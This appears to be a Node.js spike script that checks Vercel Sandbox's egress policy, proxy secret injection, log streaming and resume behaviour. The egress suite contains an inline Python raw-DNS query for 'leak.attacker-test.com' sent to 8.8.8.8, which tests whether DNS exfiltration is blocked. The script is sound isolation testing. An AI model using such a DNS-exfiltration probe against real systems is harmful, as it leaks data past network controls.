// Spike for ADR 0003: checks Vercel Sandbox against the five criteria.
//   node --env-file=.env.local spikes/vercel-sandbox/01-spike.mjs [egress|secrets|stream|resume]
import { randomBytes } from 'node:crypto'

import { Sandbox } from '@vercel/sandbox'

const only = process.argv[2]
const results = []
const record = (criterion, check, observed, ok) => {
  results.push({ criterion, check, observed, ok })
  console.log(`${ok === undefined ? '  ' : ok ? 'OK' : 'NO'} [${criterion}] ${check}: ${observed}`)
}
const sh = async (sandbox, script, timeoutMs = 40_000) => {
  const r = await sandbox.runCommand({
    cmd: 'sh',
    args: ['-c', script],
    signal: AbortSignal.timeout(timeoutMs),
  })
  return { code: r.exitCode, out: (await r.stdout()).trim(), err: (await r.stderr()).trim() }
}
const curl = (url, extra = '') =>
  `curl -sS ${extra} -m 8 -o /dev/null -w '%{http_code}' ${url} 2>&1 | tail -c 200`

async function egress() {
  const sandbox = await Sandbox.create({
    timeout: 180_000,
    networkPolicy: { allow: ['example.com', '*.example.com'] },
  })
  try {
    const probes = [
      ['https to the allowed domain', curl('https://example.com'), (o) => o === '200'],
      ['https to a host outside the list', curl('https://api.github.com'), (o) => o !== '200'],
      ['https to a bare IP', curl('https://1.1.1.1 -k'), (o) => o !== '200' && o !== '301'],
      ['plain http to the allowed domain (port 80)', curl('http://example.com'), () => undefined],
    ]
    for (const [name, script, expectOk] of probes) {
      const { out } = await sh(sandbox, script)
      record('1 egress', name, out || '(empty)', expectOk(out))
    }

    const resolveAllowed = await sh(sandbox, 'getent hosts example.com | head -1')
    record(
      '1 egress',
      'DNS resolves an allowed name',
      resolveAllowed.out || '(no answer)',
      resolveAllowed.out.length > 0,
    )
    const resolveOther = await sh(
      sandbox,
      'timeout 6 getent hosts github.com | head -1; echo "exit=$?"',
    )
    record(
      '1 egress',
      'DNS resolves a name outside the list',
      resolveOther.out.replace(/\n/g, ' | '),
      undefined,
    )

    // A raw UDP query straight to a public resolver: the exfiltration path that matters.
    const udp = await sh(
      sandbox,
      `python3 - <<'PY'
import socket,struct
q=struct.pack('>HHHHHH',0x1234,0x0100,1,0,0,0)+b''.join(bytes([len(p)])+p.encode() for p in 'leak.attacker-test.com'.split('.'))+b'\\x00\\x00\\x01\\x00\\x01'
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(4)
try:
  s.sendto(q,('8.8.8.8',53)); d,_=s.recvfrom(512); print('ANSWER',len(d),'bytes')
except Exception as e: print('NO ANSWER',type(e).__name__)
PY`,
    )
    record(
      '1 egress',
      'raw DNS query to 8.8.8.8',
      udp.out || udp.err,
      !udp.out.startsWith('ANSWER'),
    )

    await sandbox.updateNetworkPolicy('deny-all')
    const afterDeny = await sh(sandbox, curl('https://example.com'))
    record(
      '1 egress',
      'live update to deny-all blocks the allowed domain',
      afterDeny.out || '(empty)',
      afterDeny.out !== '200',
    )
    await sandbox.updateNetworkPolicy({ allow: ['example.com'] })
    const reopened = await sh(sandbox, curl('https://example.com'))
    record('1 egress', 'live update re-opens it', reopened.out, reopened.out === '200')
  } finally {
    await sandbox.stop().catch(() => {})
  }
}

async function secrets() {
  const secret = `spike-${randomBytes(8).toString('hex')}`
  const sandbox = await Sandbox.create({
    timeout: 180_000,
    networkPolicy: {
      allow: { 'postman-echo.com': [{ transform: [{ headers: { 'x-api-key': secret } }] }] },
    },
  })
  try {
    const viaCurl = await sh(sandbox, `curl -sS -m 10 https://postman-echo.com/headers`)
    record(
      '2 secrets',
      'curl: the header reaches the server',
      viaCurl.out.includes(secret) ? 'injected' : viaCurl.out.slice(0, 160),
      viaCurl.out.includes(secret),
    )

    const viaNode = await sh(
      sandbox,
      `node -e "fetch('https://postman-echo.com/headers').then(r=>r.text()).then(t=>console.log(t)).catch(e=>console.log('ERR',e.cause?.code||e.message))"`,
    )
    record(
      '2 secrets',
      'Node fetch: trusts the proxy CA and gets the header',
      viaNode.out.includes(secret) ? 'injected' : viaNode.out.slice(0, 160),
      viaNode.out.includes(secret),
    )

    const inEnv = await sh(sandbox, `env | grep -c '${secret}' || true`)
    const onDisk = await sh(
      sandbox,
      `grep -rIl '${secret}' /home /root /etc /tmp /vercel /var 2>/dev/null | head -3; true`,
    )
    record(
      '2 secrets',
      'the secret is not in the sandbox environment',
      `matches=${inEnv.out}`,
      inEnv.out === '0',
    )
    record(
      '2 secrets',
      'the secret is not on the sandbox disk',
      onDisk.out || 'no file',
      onDisk.out === '',
    )
    const vars = await sh(sandbox, `env | grep -iE 'proxy|ca_|cert' | cut -c1-90 | head -8`)
    record(
      '2 secrets',
      'proxy and CA variables in the sandbox',
      vars.out.replace(/\n/g, ' | '),
      undefined,
    )
  } finally {
    await sandbox.stop().catch(() => {})
  }
}

async function stream() {
  const sandbox = await Sandbox.create({ timeout: 120_000 })
  try {
    const started = Date.now()
    const cmd = await sandbox.runCommand({
      cmd: 'sh',
      args: ['-c', 'for i in 1 2 3 4 5; do echo tick$i; sleep 1; done; echo done >&2'],
      detached: true,
    })
    const seen = []
    for await (const log of cmd.logs()) {
      seen.push({ at: Date.now() - started, stream: log.stream, data: log.data.trim() })
    }
    const ticks = seen.filter((l) => l.data.startsWith('tick'))
    const spread = ticks.length > 1 ? ticks.at(-1).at - ticks[0].at : 0
    record(
      '3 streaming',
      'stdout arrives while the command runs',
      `${ticks.length} ticks over ${spread} ms: ${ticks.map((t) => t.at).join(', ')}`,
      ticks.length === 5 && spread >= 3000,
    )
    record(
      '3 streaming',
      'stderr is a separate stream',
      JSON.stringify(seen.filter((l) => l.stream === 'stderr')),
      seen.some((l) => l.stream === 'stderr' && l.data === 'done'),
    )
  } finally {
    await sandbox.stop().catch(() => {})
  }
}

async function resume() {
  const name = `spike-persist-${Date.now()}`
  const sandbox = await Sandbox.create({ name, persistent: true, timeout: 180_000 })
  try {
    const dir = (await sh(sandbox, 'pwd')).out
    await sh(
      sandbox,
      `echo kept-on-disk > state.txt && (nohup sh -c 'while true; do date +%s > ticking.txt; sleep 1; done' >/dev/null 2>&1 & echo $! > worker.pid)`,
    )
    const before = await sh(sandbox, `cat /proc/sys/kernel/random/boot_id; cat worker.pid`)
    const [bootBefore, pid] = before.out.split('\n')
    record('4 resume', 'workspace directory', dir, undefined)

    await sandbox.stop()
    const again = await Sandbox.get({ name, resume: true })
    const after = await sh(
      again,
      `cat state.txt; cat /proc/sys/kernel/random/boot_id; (kill -0 ${pid} 2>/dev/null && echo ALIVE || echo GONE)`,
    )
    const [file, bootAfter, alive] = after.out.split('\n')
    record(
      '4 resume',
      'file written before the stop is there after resume',
      file,
      file === 'kept-on-disk',
    )
    record(
      '4 resume',
      'resume starts a new VM session',
      `boot_id changed: ${bootBefore !== bootAfter}`,
      undefined,
    )
    record('5 waiting', 'a background process survives stop and resume', alive, undefined)
    await again.stop().catch(() => {})
  } finally {
    await Sandbox.get({ name })
      .then((s) => s.delete())
      .catch(() => {})
  }
}

const suites = { egress, secrets, stream, resume }
for (const [name, fn] of Object.entries(suites)) {
  if (only && only !== name) continue
  console.log(`\n== ${name}`)
  try {
    await fn()
  } catch (error) {
    record(name, 'suite crashed', error instanceof Error ? error.message : String(error), false)
  }
}
console.log('\n' + JSON.stringify(results, null, 2))
